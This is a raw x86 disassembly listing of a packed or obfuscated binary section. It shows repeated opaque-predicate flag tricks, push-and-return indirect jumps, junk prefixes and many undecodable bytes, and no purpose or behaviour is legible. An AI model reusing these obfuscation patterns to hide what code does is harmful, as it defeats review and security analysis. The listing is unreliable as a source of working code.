  40d8d6:	adc    al,0xb5
  40d8d8:	pop    ecx
  40d8d9:	and    BYTE PTR [edi+0x59],0x2e
  40d8dd:	jge    0x40d8ac
  40d8df:	das    
  40d8e0:	add    edi,DWORD PTR [edi+0x3c]
  40d8e3:	pushf  
  40d8e4:	and    WORD PTR [esp],0xfe
  40d8ea:	popf   
  40d8eb:	jae    0x40f1d1
  40d8f1:	(bad)  
  40d8f2:	mov    al,ds:0xe1ae82ae
  40d8f7:	jge    0x40d927
  40d8f9:	cld    
  40d8fa:	jge    0x40d87e
  40d8fc:	dec    edx
  40d8fd:	(bad)  
  40d8fe:	mov    edi,0xcccccc
	...
  40d91b:	add    BYTE PTR [eax],al
  40d91d:	xchg   esi,eax
  40d91e:	je     0x40e2fb
  40d924:	cs ss nop
  40d927:	jmp    0x40e751
  40d92c:	mov    ch,0xa0
  40d92e:	mov    al,ds:0x21b51d10
  40d933:	mov    ch,0xd1
  40d935:	jle    0x40d8d6
  40d937:	inc    ecx
  40d938:	jl     0x40d8ef
  40d93a:	mov    BYTE PTR [edx+0x2e555076],0x90
  40d941:	repnz mov ebp,0x40f498
  40d947:	cld    
  40d948:	xchg   DWORD PTR [esp],ebp
  40d94b:	ss ret 0x0
  40d94f:	scas   al,BYTE PTR es:[edi]
  40d950:	or     BYTE PTR ds:0x2c67c6b5,bl
  40d956:	mov    ch,0xae
  40d958:	inc    ecx
  40d959:	and    DWORD PTR [edi-0x72f90846],ebx
  40d95f:	nop
  40d960:	pushf  
  40d961:	mov    esi,0xf7e9f22e
  40d966:	clc    
  40d967:	(bad)  
  40d968:	jmp    FWORD PTR [eax+edx*1]
  40d96b:	ins    DWORD PTR es:[edi],dx
  40d96c:	dec    edx
  40d96d:	addr16 mov ch,0x59
  40d970:	sbb    eax,0xfc8fae8f
  40d975:	adc    BYTE PTR [ebp-0x634af761],dh
  40d97b:	scas   eax,DWORD PTR es:[edi]
  40d97c:	mov    eax,esi
  40d97e:	nop
  40d97f:	repz cs jmp 0x40d4db
  40d986:	mov    al,ds:0x7c67b582
  40d98b:	mov    ch,0xb5
  40d98d:	(bad)  
  40d98e:	cld    
  40d98f:	sar    esp,1
  40d991:	mov    ch,0x67
  40d993:	lahf   
  40d994:	and    DWORD PTR [ebp-0x34ade4b],esi
  40d99a:	nop
  40d99b:	ins    BYTE PTR es:[edi],dx
  40d99c:	imul   ebp,ecx,0x3e
  40d99f:	sldt   WORD PTR [eax]
  40d9a2:	nop
  40d9a3:	es jmp 0x40a46b
  40d9a9:	or     BYTE PTR [ebp+0x41],ch
  40d9ac:	adc    ah,bh
  40d9ae:	scas   al,BYTE PTR es:[edi]
  40d9af:	mov    ch,0x9f
  40d9b1:	(bad)  
  40d9b2:	adc    dh,bl
  40d9b4:	ins    DWORD PTR es:[edi],dx
  40d9b5:	and    esi,ebx
  40d9b7:	jl     0x40d9c9
  40d9b9:	dec    ebx
  40d9ba:	pop    ecx
  40d9bb:	jle    0x40d9c0
  40d9bd:	clc    
  40d9be:	push   eax
  40d9bf:	ds cld 
  40d9c1:	ss mov eax,0x40b265
  40d9c7:	xchg   DWORD PTR ss:[esp],eax
  40d9cb:	bnd ret 0x0
  40d9cf:	ins    DWORD PTR es:[edi],dx
  40d9d0:	loope  0x40d987
  40d9d2:	and    ecx,esp
  40d9d4:	ins    DWORD PTR es:[edi],dx
  40d9d5:	loope  0x40d9df
  40d9d7:	(bad)  
  40d9d8:	mov    esi,0x7503c7b5
  40d9dd:	and    al,0x9c
  40d9df:	and    WORD PTR [esp],0xfe
  40d9e5:	popf   
  40d9e6:	jae    0x40d881
  40d9ec:	and    esi,eax
  40d9ee:	adc    al,0xa0
  40d9f0:	mov    ch,0x41
  40d9f2:	mov    ch,0xb5
  40d9f4:	test   BYTE PTR [eax],cl
  40d9f6:	sbb    eax,0x3485218f
  40d9fb:	test   BYTE PTR [ebx-0x6f6fc140],0xe9
  40da02:	jmp    0xb540da1d
  40da07:	inc    ecx
  40da08:	adc    al,0xde
  40da0a:	adc    BYTE PTR [edi+0x59b541b5],bl
  40da10:	jl     0x40d9b2
  40da12:	and    BYTE PTR [ecx],0xb5
  40da15:	pop    DWORD PTR [edx+0x7b2c2141]
  40da1b:	test   eax,eax
  40da1d:	push   edx
  40da1e:	repz cs cld 
  40da21:	mov    edx,0x40dc24
  40da26:	xacquire xchg DWORD PTR [esp],edx
  40da2a:	ds ret 0x0
  40da2e:	sub    al,0x2e
  40da30:	mov    ch,0xbe
  40da32:	and    DWORD PTR [ebp+0x2e],edi
  40da35:	and    DWORD PTR [edx-0x7c42a6df],eax
  40da3b:	add    edx,DWORD PTR [edx+0x3c]
  40da3e:	pushf  
  40da3f:	and    WORD PTR [esp],0xfe
  40da45:	popf   
  40da46:	jae    0x40c15a
  40da4c:	test   BYTE PTR [ebp+0x21211d4a],dh
  40da52:	adc    al,0xfc
  40da54:	sub    al,0x6d
  40da56:	sub    al,0x14
  40da58:	sub    al,0xf1
  40da5a:	lods   eax,DWORD PTR ds:[esi]
  40da5b:	fcmovne st,st(4)
  40da5d:	int3   
  40da5e:	int3   
	...
  40da77:	add    BYTE PTR [eax],al
  40da79:	add    BYTE PTR [eax+0x25],bh
  40da7c:	rcr    BYTE PTR ds:0x247c8df6,1
  40da82:	and    BYTE PTR [esi+eiz*2-0x1dbdb7f],bl
  40da89:	add    BYTE PTR [ebp+0x535830f],bl
  40da8f:	add    BYTE PTR [eax],al
  40da91:	or     BYTE PTR [edi+0x859a021],bl
  40da97:	loope  0x40da7a
  40da99:	mov    ch,0x4b
  40da9b:	push   ebx
  40da9c:	dec    ebx
  40da9d:	fdivp  st(7),st
  40da9f:	jne    0x40daa1
  40daa1:	pushf  
  40daa2:	and    WORD PTR [esp],0xfe
  40daa8:	popf   
  40daa9:	jae    0x40e897
  40daaf:	lahf   
  40dab0:	cld    
  40dab1:	fisubr WORD PTR [esi]
  40dab3:	dec    edx
  40dab4:	inc    ecx
  40dab5:	dec    edx
  40dab6:	test   BYTE PTR [ecx],ah
  40dab8:	lahf   
  40dab9:	and    esi,eax
  40dabb:	mov    esi,0x3e90547a
  40dac0:	jmp    0x40bd16
  40dac5:	addr16 jge 0x40da7d
  40dac8:	mov    ch,0xa0
  40daca:	(bad)  
  40dacb:	(bad)  
  40dacd:	sbb    eax,0x7c10d167
  40dad2:	(bad)  
  40dad3:	mov    esi,0xe1b57cae
  40dad8:	sbb    eax,0xff61b5a0
  40dadd:	int3   
  40dade:	int3   
  40dadf:	int3   
	...
  40daf8:	add    BYTE PTR [eax],al
  40dafa:	add    cl,ah
  40dafc:	ret    0x9db8
  40daff:	loopne 0x40db51
  40db01:	and    ebx,DWORD PTR [esi+eiz*2-0x1dbdb7f]
  40db08:	add    BYTE PTR [ebp-0x15747cf1],bl
  40db0e:	(bad)  
  40db0f:	call   DWORD PTR [eax]
  40db11:	(bad)  
  40db12:	mov    ch,0x4a
  40db14:	sub    al,0x8
  40db16:	dec    edx
  40db17:	scas   al,BYTE PTR es:[edi]
  40db18:	mov    al,ds:0xf9417d21
  40db1d:	pop    ecx
  40db1e:	je     0x40db60
  40db20:	mov    ds:0xb47d0000,al
  40db25:	xor    al,0xd0
  40db27:	aas    
  40db28:	inc    esi
  40db29:	cld    
  40db2a:	ds jmp 0x40e082
  40db30:	and    DWORD PTR [ecx-0x4b],ebx
  40db33:	(bad)  
  40db34:	mov    ch,0xb5
  40db36:	and    DWORD PTR [esi],ebp
  40db38:	dec    ebx
  40db39:	mov    ch,0xde
  40db3b:	mov    ch,0xe1
  40db3d:	ins    DWORD PTR es:[edi],dx
  40db3e:	and    DWORD PTR [ebp-0x704a7042],esi
  40db44:	mov    ch,0x21
  40db46:	aas    
  40db47:	pop    edi
  40db48:	ss repz es jmp 0x40e9fe
  40db50:	and    DWORD PTR [ebx+0x67],edx
  40db53:	or     BYTE PTR [ecx-0x4b],al
  40db56:	mov    ch,0x8
  40db58:	pop    ecx
  40db59:	adc    ah,bh
  40db5b:	or     cl,ah
  40db5d:	and    esi,eax
  40db5f:	cs (bad) 
  40db61:	mov    esi,0xe67d4b84
  40db66:	mov    esi,DWORD PTR [ebx+0x3c]
  40db69:	push   ecx
  40db6a:	repnz ss cld 
  40db6d:	mov    ecx,0x40eda5
  40db72:	xrelease xchg DWORD PTR [esp],ecx
  40db76:	cld    
  40db77:	ret    0x0
  40db7a:	pop    ecx
  40db7b:	mov    ch,0x84
  40db7d:	jle    0x40dbfd
  40db7f:	or     BYTE PTR [ebp-0x52],ch
  40db82:	sub    al,0x67
  40db84:	dec    ecx
  40db85:	inc    ebx
  40db86:	test   DWORD PTR [edi],0xffffffff
  40db8c:	ss es cld 
  40db8f:	jmp    0x40d280
  40db94:	dec    ebx
  40db95:	ficom  WORD PTR [ebx+0x1d]
  40db98:	sub    al,0xd1
  40db9a:	inc    ecx
  40db9b:	mov    ch,0x59
  40db9d:	scas   al,BYTE PTR es:[edi]
  40db9e:	scas   al,BYTE PTR es:[edi]
  40db9f:	adc    BYTE PTR [esi-0x584a5f83],ch
  40dba5:	xor    eax,eax
  40dba7:	pushf  
  40dba8:	and    WORD PTR [esp],0xfe
  40dbae:	popf   
  40dbaf:	jae    0x40cab7
  40dbb5:	mov    ch,0xb5
  40dbb7:	sub    al,0xde
  40dbb9:	mov    ch,0x21
  40dbbb:	mov    ch,0xb5
  40dbbd:	mov    ch,0x10
  40dbbf:	mov    al,ds:0x5c7c412e
  40dbc4:	dec    edi
  40dbc5:	mov    ecx,0x18
  40dbca:	pushf  
  40dbcb:	and    WORD PTR [esp],0xfe
  40dbd1:	popf   
  40dbd2:	jae    0x40c93a
  40dbd8:	adc    dh,al
  40dbda:	mov    ch,0xae
  40dbdc:	mov    esi,0x4bd1b56d
  40dbe1:	jle    0x40db98
  40dbe3:	call   0xe926:0xf336128b
  40dbea:	test   ch,al
  40dbec:	(bad)  
  40dbed:	push   DWORD PTR [ebp+0x4bb559e1]
  40dbf3:	dec    ebx
  40dbf4:	or     BYTE PTR [ebx+0x67],dl
  40dbf7:	mov    ch,0xd1
  40dbf9:	cld    
  40dbfa:	mov    ch,0x59
  40dbfc:	test   BYTE PTR [esi+ebx*8],ch
  40dbff:	mov    ch,0x10
  40dc01:	adc    BYTE PTR [eax],0x52
  40dc04:	popf   
  40dc05:	pushf  
  40dc06:	and    WORD PTR [esp],0xfe
  40dc0c:	popf   
  40dc0d:	jae    0x40eca3
  40dc13:	ror    DWORD PTR [edi+0x4a597e8f],1
  40dc19:	ins    DWORD PTR es:[edi],dx
  40dc1a:	mov    ch,0xb5
  40dc1c:	test   BYTE PTR [ecx],ah
  40dc1e:	fidiv  WORD PTR [ebp+0x3f9d10a0]
  40dc24:	je     0x40c53b
  40dc2a:	pushf  
  40dc2b:	and    WORD PTR [esp],0xfe
  40dc31:	popf   
  40dc32:	jae    0x40cf71
  40dc38:	mov    esi,0x149f2c2c
  40dc3d:	adc    cl,ah
  40dc3f:	push   ebx
  40dc40:	mov    ch,0x14
  40dc42:	pop    ss
  40dc43:	pusha  
  40dc44:	pushf  
  40dc45:	and    WORD PTR [esp],0xfe
  40dc4b:	popf   
  40dc4c:	jae    0x40e0a6
  40dc52:	push   ebx
  40dc53:	loope  0x40dc0a
  40dc55:	mov    ch,0x67
  40dc57:	ins    DWORD PTR es:[edi],dx
  40dc58:	sbb    eax,0x2cb5bed1
  40dc5d:	(bad)  
  40dc5e:	mov    ch,0x8
  40dc60:	jle    0x40dc2c
  40dc62:	mov    esi,DWORD PTR [ebp+0x24]
  40dc65:	pushf  
  40dc66:	and    WORD PTR [esp],0xfe
  40dc6c:	popf   
  40dc6d:	jae    0x40f26e
  40dc73:	inc    ecx
  40dc74:	loope  0x40dc2b
  40dc76:	adc    BYTE PTR [edi+eiz*2],0xb5
  40dc7a:	and    DWORD PTR [ecx],esp
  40dc7c:	lahf   
  40dc7d:	inc    ecx
  40dc7e:	addr16 mov ch,0x17
  40dc81:	xchg   ecx,eax
  40dc82:	pushf  
  40dc83:	and    WORD PTR [esp],0xfe
  40dc89:	popf   
  40dc8a:	jae    0x40dd23
  40dc90:	jle    0x40dcdd
  40dc92:	jle    0x40dc5a
  40dc94:	and    DWORD PTR [edi-0x1f],esp
  40dc97:	pop    ecx
  40dc98:	and    DWORD PTR ds:0x2cb5d184,ebx
  40dc9e:	fisub  WORD PTR [ebx-0x6f6f2efd]
  40dca4:	jmp    0x40a6c4
  40dca9:	(bad)  
  40dcaa:	sub    al,0x2e
  40dcac:	dec    ebx
  40dcad:	or     BYTE PTR [edx+0x6d7ee11d],al
  40dcb3:	mov    ch,0xb5
  40dcb5:	jl     0x40dc6c
  40dcb7:	cs lahf 
  40dcb9:	mov    ch,0xbe
  40dcbb:	dec    ebx
  40dcbc:	test   BYTE PTR [edi+edi*4],ch
  40dcbf:	mov    DWORD PTR [eax+0x14],ecx
  40dcc2:	pushf  
  40dcc3:	and    WORD PTR [esp],0xfe
  40dcc9:	popf   
  40dcca:	jae    0x40a3ed
  40dcd0:	sub    al,0x9f
  40dcd2:	or     BYTE PTR [ebp+0x41],bh
  40dcd5:	pop    esi
  40dcd7:	sbb    eax,0x5910144b
  40dcdc:	mov    ch,0xbc
  40dcde:	(bad)  
  40dcdf:	retf   0xcccc
  40dce2:	int3   
	...
  40dcfb:	add    BYTE PTR [eax],al
  40dcfd:	add    BYTE PTR [eax+0x2f00000c],cl
  40dd03:	test   esi,esi
  40dd05:	bnd cs jmp 0x40e200
  40dd0c:	push   ebx
  40dd0d:	ins    DWORD PTR es:[edi],dx
  40dd0e:	mov    ch,0x8
  40dd10:	mov    ch,0xb5
  40dd12:	test   cl,dl
  40dd14:	mov    ch,0x1d
  40dd16:	mov    al,ds:0xdeb5d114
  40dd1b:	and    esi,ebx
  40dd1d:	loope  0x40dd78
  40dd1f:	scas   al,BYTE PTR es:[edi]
  40dd20:	test   BYTE PTR [ecx-0x6],cl
  40dd23:	ret    
  40dd24:	pushf  
  40dd25:	and    WORD PTR [esp],0xfe
  40dd2b:	popf   
  40dd2c:	jae    0x40a40e
  40dd32:	mov    ch,0x8f
  40dd34:	fimul  WORD PTR [ebx-0x4b]
  40dd37:	pop    ecx
  40dd38:	mov    ch,0x10
  40dd3a:	and    DWORD PTR [ebx+0x21],edx
  40dd3d:	sbb    eax,0x547dbe82
  40dd42:	fldenv [ebp-0x333333e1]
	...
  40dd60:	add    BYTE PTR [eax],al
  40dd62:	add    BYTE PTR [esi+0x3],cl
  40dd65:	dec    ecx
  40dd66:	cmp    al,0xf2
  40dd68:	es repz jmp 0x40f7a5
  40dd6f:	mov    ch,0xb5
  40dd71:	sub    al,0xb5
  40dd73:	mov    ch,0x4a
  40dd75:	scas   al,BYTE PTR es:[edi]
  40dd76:	(bad)  
  40dd77:	jle    0x40dd57
  40dd79:	cs jge 0x40dd1b
  40dd7c:	mov    ch,0x82
  40dd7e:	cld    
  40dd7f:	mov    ch,0x7e
  40dd81:	mov    ch,0x96
  40dd83:	int3   
  40dd84:	int3   
  40dd85:	int3   
	...
  40dd9e:	add    BYTE PTR [eax],al
  40dda0:	add    BYTE PTR [esi-0x6fae3e75],bh
  40dda6:	ds nop
  40dda8:	lea    ecx,ds:0x40ea80
  40ddae:	nop
  40ddaf:	xchg   DWORD PTR [esp],ecx
  40ddb2:	bnd ret 0x0
  40ddb6:	or     BYTE PTR [eax],dl
  40ddb8:	mov    ch,0xd1
  40ddba:	mov    esi,0x2c08539f
  40ddbf:	mov    ch,0xe7
  40ddc1:	jne    0x40ad72
  40ddc7:	cs ss es jmp 0x40f7e6
  40ddcf:	or     BYTE PTR [ebp-0x4ad37b4b],dh
  40ddd5:	mov    ch,0x14
  40ddd7:	mov    ch,0x7c
  40ddd9:	mov    ch,0x84
  40dddb:	or     BYTE PTR [edi-0x74f02ef8],0x1
  40dde2:	push   ebx
  40dde3:	cs ss nop
  40dde6:	mov    ebx,0x40f69e
  40ddeb:	xrelease xchg DWORD PTR [esp],ebx
  40ddef:	bnd ret 0x0
  40ddf3:	or     BYTE PTR [ebp-0x60],ch
  40ddf6:	mov    ch,0x21
  40ddf8:	sbb    eax,0xb5211d10
  40ddfd:	mov    esi,0x3c76035f
  40de02:	pushf  
  40de03:	and    WORD PTR [esp],0xfe
  40de09:	popf   
  40de0a:	jae    0x40b0ec
  40de10:	adc    BYTE PTR [ebp-0x4ade4adf],dh
  40de16:	ror    DWORD PTR [eax],1
  40de18:	shl    ecx,1
  40de1a:	mov    ch,0xc6
  40de1c:	fiadd  WORD PTR [ecx+0x466876f0]
  40de22:	inc    esp
  40de23:	xor    al,0x33
  40de25:	push   esi
  40de26:	cs es ss mov esi,0x40e854
  40de2e:	nop
  40de2f:	xchg   DWORD PTR [esp],esi
  40de32:	cs ret 0x0
  40de36:	sbb    eax,0x82b5d182
  40de3b:	ins    DWORD PTR es:[edi],dx
  40de3c:	addr16 and edi,ebp
  40de3f:	push   ecx
  40de40:	cs cld 
  40de42:	repz jmp 0x40a63d
  40de48:	sbb    eax,0x1484aed1
  40de4d:	test   cl,dl
  40de4f:	addr16 cld 
  40de51:	mov    esi,0x2e7cb567
  40de56:	mov    ch,0xae
  40de58:	cs jl  0x40de21
  40de5b:	loope  0x40de23
  40de5d:	inc    ebp
  40de5e:	push   esi
  40de5f:	add    eax,DWORD PTR [eax+0x3c]
  40de62:	push   esi
  40de63:	cs es repz mov esi,0x40e8bd
  40de6b:	xacquire xchg DWORD PTR [esp],esi
  40de6f:	ds ret 0x0
  40de73:	mov    esi,0xb5e1b57d
  40de78:	mov    al,ds:0x102121b5
  40de7d:	mov    ebp,0x30b21b8
  40de82:	repz pushf 
  40de84:	and    WORD PTR [esp],0xfe
  40de8a:	popf   
  40de8b:	jae    0x40cd79
  40de91:	cs mov ch,0xd1
  40de94:	jge    0x40de4b
  40de96:	jl     0x40de4d
  40de98:	fsubrp st(1),st
  40de9a:	sub    BYTE PTR [ecx+ebx*2],0x8f
  40de9e:	(bad)  
  40de9f:	pop    ss
  40dea0:	pop    ecx
  40dea1:	pushf  
  40dea2:	and    WORD PTR [esp],0xfe
  40dea8:	popf   
  40dea9:	jae    0x40d65c
  40deaf:	and    DWORD PTR [ecx+ebx*2],edx
  40deb2:	adc    al,0xb5
  40deb4:	mov    ch,0x10
  40deb6:	dec    edx
  40deb7:	sbb    eax,0x598f2182
  40debc:	mov    ch,0xae
  40debe:	icebp  
  40debf:	jno    0x40dedc
  40dec1:	jmp    0x40c3d4
  40dec6:	ds bnd jmp 0x40e4f4
  40decd:	(bad)  
  40dece:	loope  0x40df4d
  40ded0:	adc    al,0xb5
  40ded2:	adc    al,0x2c
  40ded4:	mov    ch,0x21
  40ded6:	sub    al,0xc6
  40ded8:	mov    ch,0xae
  40deda:	addr16 cld 
  40dedc:	mov    ch,0x67
  40dede:	ins    DWORD PTR es:[edi],dx
  40dedf:	inc    edi
  40dee0:	call   DWORD PTR [ebp+0x10]
  40dee3:	push   ecx
  40dee4:	repnz repz repz mov ecx,0x40bae9
  40deec:	xrelease xchg DWORD PTR [esp],ecx
  40def0:	bnd ret 0x0
  40def4:	mov    ch,0x7d
  40def6:	dec    edx
  40def7:	and    DWORD PTR [esi-0x4a2e21df],edi
  40defd:	test   BYTE PTR [eax+0x5d],bl
  40df00:	cs int3 
  40df02:	int3   
  40df03:	int3   
	...
  40df1c:	add    BYTE PTR [eax],al
  40df1e:	add    BYTE PTR [ebx-0x7e9963aa],bl
  40df24:	and    al,0x24
  40df26:	inc    BYTE PTR [eax]
  40df28:	popf   
  40df29:	jae    0x40a65d
  40df2f:	mov    ch,0xb5
  40df31:	loope  0x40ded3
  40df33:	cmp    BYTE PTR [esp+edi*8-0x71],0x21
  40df38:	jle    0x40df84
  40df3a:	scas   al,BYTE PTR es:[edi]
  40df3b:	and    DWORD PTR [ebp+0x68dade],esi
  40df41:	add    BYTE PTR [eax],al
  40df43:	add    BYTE PTR [esi],dh
  40df45:	repz jmp 0x40db47
  40df4b:	ins    DWORD PTR es:[edi],dx
  40df4c:	inc    ecx
  40df4d:	mov    esi,0xb52ec608
  40df52:	cld    
  40df53:	sub    al,0xb5
  40df55:	pop    DWORD PTR [ecx+0x2e]
  40df58:	mov    ch,0xb5
  40df5a:	scas   al,BYTE PTR es:[edi]
  40df5b:	scas   al,BYTE PTR es:[di]
  40df5d:	add    DWORD PTR [eax-0x8ffffa8],0xe9362659
  40df67:	xor    eax,0x1000000a
  40df6c:	or     BYTE PTR [bx+si],dl
  40df6f:	adc    al,0x82
  40df71:	ror    DWORD PTR [ebx+0x4a],1
  40df74:	and    DWORD PTR [ebp-0x51984a4b],esi
  40df7a:	lahf   
  40df7b:	push   ebx
  40df7c:	lahf   
  40df7d:	dec    ebx
  40df7e:	dec    edx
  40df7f:	and    ecx,esp
  40df81:	push   ecx
  40df82:	pop    ecx
  40df83:	mov    al,0x14
  40df85:	aam    0xdf
  40df87:	cmp    DWORD PTR [esi],0x0
  40df8a:	ss cld 
  40df8c:	ds jmp 0x40bbad
  40df92:	jge    0x40dfb1
  40df94:	adc    al,0x10
  40df96:	mov    ch,0x4b
  40df98:	or     BYTE PTR [ebp+0x2eb5e110],dh
  40df9e:	dec    edx
  40df9f:	sub    al,0x8
  40dfa1:	mov    ch,0x7d
  40dfa3:	dec    ebx
  40dfa4:	fiadd  WORD PTR [edi+0x51]
  40dfa7:	push   esi
  40dfa8:	nop
  40dfa9:	ds lea esi,cs:0x40c203
  40dfb1:	nop
  40dfb2:	xchg   DWORD PTR [esp],esi
  40dfb5:	cld    
  40dfb6:	ret    0x0
  40dfb9:	dec    edx
  40dfba:	or     BYTE PTR [eax],cl
  40dfbc:	or     BYTE PTR [ebp-0x4a4adea7],dh
  40dfc2:	or     BYTE PTR [ebp-0xdaf59a7],dh
  40dfc8:	repnz bnd jmp 0x40b44a
  40dfcf:	mov    al,ds:0xb5dedeb5
  40dfd4:	pop    ecx
  40dfd5:	loope  0x40e054
  40dfd7:	scas   al,BYTE PTR es:[edi]
  40dfd8:	dec    edx
  40dfd9:	or     BYTE PTR [edi+ecx*4+0x6d8f5310],al
  40dfe0:	adc    BYTE PTR [ebx-0x22],0xb5
  40dfe4:	pushf  
  40dfe5:	push   edx
  40dfe6:	push   ecx
  40dfe7:	cld    
  40dfe8:	cld    
  40dfe9:	bnd jmp 0x40eec2
  40dfef:	mov    ch,0xb5
  40dff1:	adc    BYTE PTR [ecx-0x4b],bl
  40dff4:	adc    BYTE PTR [ebp+0x7e4bb5b5],dh
  40dffa:	and    DWORD PTR [esi+0x1d9f087c],edi
  40e000:	adc    al,0x7d
  40e002:	or     BYTE PTR [edx+ecx*4-0x7e9963a2],al
  40e009:	and    al,0x24
  40e00b:	inc    BYTE PTR [eax]
  40e00d:	popf   
  40e00e:	jae    0x40f376
  40e014:	dec    edx
  40e015:	and    DWORD PTR [ebp+0x59b54a2c],esi
  40e01b:	scas   al,BYTE PTR es:[edi]
  40e01c:	or     BYTE PTR [esi],ch
  40e01e:	or     BYTE PTR [ebp+0x77b56d9f],dh
  40e024:	mov    esi,DWORD PTR [esi+edx*4]
  40e027:	push   esi
  40e028:	ss cs cld 
  40e02b:	mov    esi,0x40de81
  40e030:	xchg   DWORD PTR es:[esp],esi
  40e034:	nop
  40e035:	ret    0x0
  40e038:	fidiv  WORD PTR [ebp+0x2e14bebe]
  40e03e:	jle    0x40e0be
  40e040:	mov    ch,0x14
  40e042:	mov    edx,ecx
  40e044:	pop    eax
  40e045:	pushf  
  40e046:	and    WORD PTR [esp],0xfe
  40e04c:	popf   
  40e04d:	jae    0x40d364
  40e053:	adc    al,0x1d
  40e055:	jl     0x40e078
  40e057:	addr16 adc al,0x4b
  40e05a:	(bad)  
  40e05b:	mov    ch,0x1d
  40e05d:	inc    ecx
  40e05e:	test   BYTE PTR [eax],cl
  40e060:	loope  0x40e0a3
  40e062:	sti    
  40e063:	push   ebx
  40e064:	push   ebp
  40e065:	es ds lea ebp,ds:0x40af8a
  40e06e:	xchg   DWORD PTR es:[esp],ebp
  40e072:	ds ret 0x0
  40e076:	cld    
  40e077:	lahf   
  40e078:	loope  0x40e02f
  40e07a:	mov    ch,0x10
  40e07c:	mov    esi,0x2c67212e
  40e081:	jmp    0x40e0c9
  40e083:	nop
  40e084:	cld    
  40e085:	jmp    0x40edc5
  40e08a:	(bad)  
  40e08b:	(bad)  
  40e08c:	jl     0x40e09e
  40e08e:	mov    esi,0xaed1b54b
  40e093:	test   BYTE PTR [ecx],ah
  40e095:	inc    ecx
  40e096:	pop    ecx
  40e097:	loope  0x40e039
  40e099:	mov    ch,0x8
  40e09b:	sbb    eax,0xe121c6b5
  40e0a0:	add    bh,0x0
  40e0a3:	add    BYTE PTR [esi+ebx*4],dh
  40e0a6:	push   0x0
  40e0ab:	cs nop
  40e0ad:	bnd jmp 0x40f193
  40e0b3:	adc    BYTE PTR [ebp+0x2c],bh
  40e0b6:	and    DWORD PTR [esi],ebp
  40e0b8:	and    DWORD PTR [eax],edx
  40e0ba:	ins    DWORD PTR es:[edi],dx
  40e0bb:	and    DWORD PTR [ecx+0x53],eax
  40e0be:	scas   al,BYTE PTR es:[edi]
  40e0bf:	mov    ch,0x7c
  40e0c1:	mov    ch,0x82
  40e0c3:	adc    al,0x43
  40e0c5:	pop    edx
  40e0c6:	pushf  
  40e0c7:	and    WORD PTR [esp],0xfe
  40e0cd:	popf   
  40e0ce:	jae    0x40d132
  40e0d4:	and    ecx,esp
  40e0d6:	(bad)  
  40e0d7:	mov    ch,0xd1
  40e0d9:	mov    ch,0xae
  40e0db:	mov    ch,0x41
  40e0dd:	and    DWORD PTR [ebp+0x6db5d19f],esi
  40e0e3:	mov    ch,0x3e
  40e0e5:	inc    esi
  40e0e6:	push   ebx
  40e0e7:	ds nop
  40e0e9:	nop
  40e0ea:	mov    ebx,0x40f395
  40e0ef:	cld    
  40e0f0:	xchg   DWORD PTR [esp],ebx
  40e0f3:	es ret 0x0
  40e0f7:	pop    ecx
  40e0f8:	mov    esi,0x2e41b5de
  40e0fd:	scas   al,BYTE PTR es:[edi]
  40e0fe:	lahf   
  40e0ff:	and    DWORD PTR [eax],edx
  40e101:	sbb    eax,0xc085e2d1
  40e106:	push   esi
  40e107:	ss repnz repz mov esi,0x40be7c
  40e10f:	xchg   DWORD PTR ds:[esp],esi
  40e113:	es ret 0x0
  40e117:	and    DWORD PTR [ebp+0x7d21b559],esi
  40e11d:	jle    0x40e19c
  40e11f:	scas   al,BYTE PTR es:[edi]
  40e120:	and    DWORD PTR [edi+0x5b],esp
  40e123:	int3   
  40e124:	int3   
  40e125:	int3   
	...
  40e13e:	add    BYTE PTR [eax],al
  40e140:	add    BYTE PTR [ecx],ch
  40e142:	lock xchg ah,cl
  40e145:	int3   
  40e146:	int3   
	...
  40e15f:	add    BYTE PTR [eax],al
  40e161:	add    BYTE PTR [edi-0x4a60f73d],ch
  40e167:	sub    al,0x4b
  40e169:	push   ebx
  40e16a:	or     BYTE PTR [ebp+0x534b2e14],dh
  40e170:	test   BYTE PTR [ecx],ah
  40e172:	cld    
  40e173:	mov    ch,0xb5
  40e175:	(bad)  
  40e176:	mov    ch,0x8f
  40e178:	scas   al,BYTE PTR es:[edi]
  40e179:	loope  0x40e198
  40e17b:	loope  0x40e132
  40e17d:	jle    0x40e134
  40e17f:	mov    ch,0x9f
  40e181:	outs   dx,DWORD PTR ds:[esi]
  40e182:	call   0x40af2c
  40e187:	pushf  
  40e188:	and    WORD PTR [esp],0xfe
  40e18e:	popf   
  40e18f:	jae    0x40dfe6
  40e195:	loope  0x40e214
  40e197:	sbb    eax,0x59b5b5b5
  40e19c:	jge    0x40e1f1
  40e19e:	adc    al,0x41
  40e1a0:	outs   dx,BYTE PTR ds:[esi]
  40e1a1:	pusha  
  40e1a2:	ds cs jmp 0x40da7f
  40e1a9:	lahf   
  40e1aa:	mov    ch,0x2e
  40e1ac:	mov    ch,0xb5
  40e1ae:	mov    ch,0xb5
  40e1b0:	or     BYTE PTR [ecx+eiz*8],dl
  40e1b3:	pop    ecx
  40e1b4:	mov    ch,0x2c
  40e1b6:	dec    ebx
  40e1b7:	mov    ch,0xb5
  40e1b9:	sbb    eax,0xb559a0b5
  40e1be:	and    ecx,eax
  40e1c0:	mov    al,ds:0x369049a3
  40e1c5:	nop
  40e1c6:	jmp    0x40d842
  40e1cb:	ficomp WORD PTR [edi+0x4a2159b5]
  40e1d1:	adc    cl,0xb5
  40e1d4:	jl     0x40e220
  40e1d6:	mov    ch,0x21
  40e1d8:	mov    esi,0x84b5d1b5
  40e1dd:	fisubr WORD PTR [esi*4-0x6f6fb9d9]
  40e1e4:	jmp    0x40e4d5
  40e1e9:	and    DWORD PTR [ebp+0x217cb5fc],esi
  40e1ef:	jl     0x40e25e
  40e1f1:	inc    ecx
  40e1f2:	test   BYTE PTR ds:0x678f7cb5,bl
  40e1f8:	pop    ecx
  40e1f9:	push   ebx
  40e1fa:	mov    ch,0x8
  40e1fc:	mov    ch,0xb5
  40e1fe:	ins    DWORD PTR es:[edi],dx
  40e1ff:	or     cl,BYTE PTR [edi]
  40e201:	test   BYTE PTR [edi],bh
  40e203:	or     al,BYTE PTR [eax]
  40e205:	add    BYTE PTR [esi+eiz*2-0x1dbdb7f],bl
  40e20c:	add    BYTE PTR [ebp+0x145830f],bl
  40e212:	add    BYTE PTR [eax],al
  40e214:	mov    ch,0xde
  40e216:	and    DWORD PTR [ebp-0x2e5f601f],esi
  40e21c:	jge    0x40e23f
  40e21e:	and    eax,0x107e834b
  40e223:	add    BYTE PTR [esi],ah
  40e225:	ss jmp 0x40ee45
  40e22b:	and    DWORD PTR [edi+0x4b],esp
